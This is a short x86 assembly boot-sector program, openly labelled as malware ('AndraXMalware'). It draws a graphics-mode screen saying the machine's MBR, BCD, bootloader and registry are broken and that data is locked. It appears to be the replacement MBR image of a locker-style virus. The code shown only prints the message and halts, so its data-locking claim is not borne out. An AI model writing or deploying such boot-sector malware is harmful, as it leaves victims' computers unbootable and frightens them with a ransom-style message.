[BITS 16]
[ORG 7C00h]
    jmp     main
main:
    xor     ax, ax     ; DS=0
    mov     ds, ax
    cld                ; DF=0 because our LODSB requires it
    mov     ax, 0012h  ; Select 640x480 16-color graphics video mode
    int     10h
    mov     si, string
    mov     bl, 10      ; Red
    call    printstr
    jmp     $

printstr:
    mov     bh, 0     ; DisplayPage
print:
    lodsb
    cmp     al, 0
    je      done
    mov     ah, 0Eh   ; BIOS.Teletype
    int     10h
    jmp     print
done:
    ret

string db "Hi, I am AndraXMalware", 13, 10, "I collab with KakunTech to make this virus", 13, 10, "Well, you need to fix MBR-BCD-Bootloader-Registry to boot into your computer", 13, 10, "Your data will locked.", 13, 10, "I hope you are fine :)."

times 510 - ($-$$) db 0
dw      0AA55h